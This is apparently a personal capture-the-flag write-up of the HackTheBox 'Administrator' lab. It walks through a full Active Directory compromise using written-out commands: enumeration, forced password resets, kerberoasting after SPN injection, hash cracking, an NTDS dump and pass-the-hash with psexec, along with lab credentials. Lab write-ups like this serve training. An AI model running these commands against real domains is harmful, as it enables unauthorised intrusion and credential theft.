---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Administrator?tab=play_machine
Difficulty: Medium
Featured: yes
aliases:
  - Windows
---

---
# Information / Description

![](../../0.%20Assets/Administrator-1791364366212.webp)
![149](../../0.%20Assets/Administrator-1791364382139.webp)

Really fun machine! I would recommend it

---

# Walkthrough



We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

Once we have the ports, we will do another `nmap` going more in detail

```
nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,55549,55599,55604,55611,55616,55630
```

```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-07 16:17:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55549/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55599/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
55604/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55611/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55616/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55630/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Add the domain to the `/etc/hosts`

![](../../0.%20Assets/Administrator-1791366485420.webp)

The server allows connections with anonymous 

```
nxc smb $T -u '' -p ''
```
![[Administrator-1791365773171.webp]]

But can't see any shares or enumerate users, the `Guest` user is disabled 


`rpc` was accessible with anonymous credentials but we are not allowed to perform different query's
![](../../0.%20Assets/Administrator-1791365750764.webp)

I also tried anonymous access on `ftp` without success

Okay so we know the anonymous access is more or less allowed but for the most part we can't do much with it.

Let's try other protocols

`ldap`
```
ldapsearch -H ldap://$T -x -b "CN=Users,DC=administrator,DC=htb" "(objectClass=person)" sAMAccountName
```

![](../../0.%20Assets/Administrator-1791366067479.webp)

And i couldn't really use any other protocols

Okay, I must be stupid, I have been looking for something for around 30 minutes and I just read this:

![](../../0.%20Assets/Administrator-1791366559599.webp)

Okay well we have credentials, let's see what we can do with them

![](../../0.%20Assets/Administrator-1791366610042.webp)

![](../../0.%20Assets/Administrator-1791366659415.webp)

Okay, before we go into `winrm` and access the machine, let's see if olivia has any shares or anything important

I will start with `ftp` so I don't forget about it 

```
netexec ftp $T -u 'Olivia' -p 'ichliebedich'
```

![](../../0.%20Assets/Administrator-1791366801571.webp)

`SMB`

```
 netexec smb $T -u 'Olivia' -p 'ichliebedich' --shares
```

![](../../0.%20Assets/Administrator-1791366900232.webp)

```
netexec smb $T -u 'Olivia' -p 'ichliebedich'  -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

![](../../0.%20Assets/Administrator-1791366974136.webp)

![](../../0.%20Assets/Administrator-1791366981885.webp)

The fie `registry.pol` was a binary and seemed interesting, so I opened with strings

![](../../0.%20Assets/Administrator-1791367113201.webp)


![](../../0.%20Assets/Administrator-1791367079840.webp)

We will keep it in mind just in case

Let's connect through evil-winrm

```
 evil-winrm -i $T -u Olivia -p 'ichliebedich'
```

![](../../0.%20Assets/Administrator-1791367200444.webp)

Seems like `olivia` is some kind of administrator, hmm, let's pull out the big guns, let's dump the domain with `RustHound` and import it to `bloodhound`

```
 ./rusthound-ce \
  -d administrator.htb \
  -u 'Olivia@administrator.htb' -p 'ichliebedich' \
  -f $T \
  -z
```

![](../../0.%20Assets/Administrator-1791367486612.webp)

Import the `.zip` and add `olivia` to the objects we own

![](../../0.%20Assets/Administrator-1791367551857.webp)

If we see the outbound objects

![](../../0.%20Assets/Administrator-1791367615046.webp)

we can see we have the `genericall` right on `Michael` 

If we go in Linux abuse Bloodhound snitches on how to abuse this right

![](../../0.%20Assets/Administrator-1791368023903.webp)

`Targeted kerberoast` It's a pretty cool technique but i do not want a hash, I want to be able to access the user directly so let's try the `Force change password` 

I had some issues so I looked online

![](../../0.%20Assets/Administrator-1791369219931.webp)

![](../../0.%20Assets/Administrator-1791369225882.webp)

```
net user  "michael" "Newpass12345"
```

Let's test it out

```
netexec smb $T -u 'michael' -p 'Newpass12345'
```

![](../../0.%20Assets/Administrator-1791369260273.webp)


Let's see what he is allowed to do

![](../../0.%20Assets/Administrator-1791369402880.webp)

Okay let's see what we can do with the user in the machine directly

```
./nxcspray all $T -u 'michael' -p 'Newpass12345'
```

![](../../0.%20Assets/Administrator-1791369380226.webp)

Again let's check shares before we change the password to benjamin

```
netexec smb $T -u 'michael' -p 'Newpass12345' --shares
SMB         10.129.160.52   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.160.52   445    DC               [+] administrator.htb\michael:Newpass12345
SMB         10.129.160.52   445    DC               [*] Enumerated shares
SMB         10.129.160.52   445    DC               Share           Permissions     Remark
SMB         10.129.160.52   445    DC               -----           -----------     ------
SMB         10.129.160.52   445    DC               ADMIN$                          Remote Admin
SMB         10.129.160.52   445    DC               C$                              Default share
SMB         10.129.160.52   445    DC               IPC$            READ            Remote IPC
SMB         10.129.160.52   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.160.52   445    DC               SYSVOL          READ            Logon server share
```

Same same, okay let's do the password change

I tried various methods and this one using `RPC` worked

```
rpcclient -U administrator.htb/michael $T
Password for [ADMINISTRATOR.HTB\michael]:
rpcclient $> setuserinfo2 benjamin 23 12345aA
```

![](../../0.%20Assets/Administrator-1791370771702.webp)

add `benjamin` to owned in bloodhound

![](../../0.%20Assets/Administrator-1791370838914.webp)


Doing the query for shortest path to domain admins we see that non of the users are actually usefull to us right now, let's see if we can do some user enumeration and some as-rep roasting or kerberoastin

![](../../0.%20Assets/Administrator-1791370930565.webp)

```
nxc smb $T -u 'benjamin' -p '12345aA' --rid-brute 10000
```

![](../../0.%20Assets/Administrator-1791371123609.webp)

Great, let's generate a list from this

```
nxc smb $T -u 'benjamin' -p '12345aA' --rid-brute 10000 | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

![](../../0.%20Assets/Administrator-1791371172248.webp)

And let's start with the AD attacks

`as-rep` roasting

```
impacket-GetNPUsers 'administrator.htb/' \
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```


![](../../0.%20Assets/Administrator-1791371226087.webp)


Okay okay, no problem, let's see `kerberoasting`

![](../../0.%20Assets/Administrator-1791371414621.webp)

No luck either, seems like we really need to get access to the user `Emily`



![](../../0.%20Assets/Administrator-1791374321018.webp)

After quite some time and enumeration I remembered that there was an `ftp` server

![](../../0.%20Assets/Administrator-1791375421134.webp)

(I literally hit my head against the table for a good 30 seconds after this)

![](../../0.%20Assets/Administrator-1791375455519.webp)

Great let's see what this is

![](../../0.%20Assets/Administrator-1791375469416.webp)

Okay so it looks like it is a password manager type a thing

I looked online for the mode for `hashcat` and did a brute force attack

```
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt --force
```

![](../../0.%20Assets/Administrator-1791375654533.webp)

![](../../0.%20Assets/Administrator-1791375686719.webp)

And it seems like we can open it in `password sage`

```
sudo apt install passwordsafe
```

Import the file and use the password we just found
![](../../0.%20Assets/Administrator-1791375871923.webp)


![](../../0.%20Assets/Administrator-1791375917428.webp)


I tested all the credentials

![](../../0.%20Assets/Administrator-1791376024518.webp)

And only `Emily` appears to be the correct one (just what we needed)

Let's spray the protocols to see what we can do with the user

```
./nxcspray all $T -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![](../../0.%20Assets/Administrator-1791376085143.webp)

So we have access to `win-rm` let's connect

```
evil-winrm -i $T -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![](../../0.%20Assets/Administrator-1791376161730.webp)

And inside Emily's Desktop we can find the first flag


Now we just follow bloodhounds path

![](../../0.%20Assets/Administrator-1791376244697.webp)

I had some issues but I figured out, basically we want to make a targeted `kerberoast` attack and because `kerberoasting` depends on a SPN attached to a user and `Ethan` does not have one we need to inject one

First mimic the DC's time

```
sudo timedatectl set-ntp off
sudo rdate -n $T
```

Inject the `SPN`

```
bloodyAD -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --host 10.129.160.52 set object Ethan servicePrincipalName -v 'falso/servicio'
```

Perform the `kerberoasting` attack

```
nxc ldap $T -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoasting hashes.txt
```

![](../../0.%20Assets/Administrator-1791378282491.webp)

Crack the hash

```
sudo hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt  --force
```


![](../../0.%20Assets/Administrator-1791378326550.webp)



![](../../0.%20Assets/Administrator-1791378371061.webp)


Great we only need the `DCSync`  or dump of credentials

![](../../0.%20Assets/Administrator-1791378745023.webp)

We can't access through `win-rm` so we need to abuse from Linux 

![](../../0.%20Assets/Administrator-1791378534011.webp)



```
nxc smb $T -u ethan -p 'limpbizkit' --ntds
```

![](../../0.%20Assets/Administrator-1791378952156.webp)


```
psexec.py administrator.htb/administrator@$T -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
```

![](../../0.%20Assets/Administrator-1791379192165.webp)

![](../../0.%20Assets/Administrator-1791379214360.webp)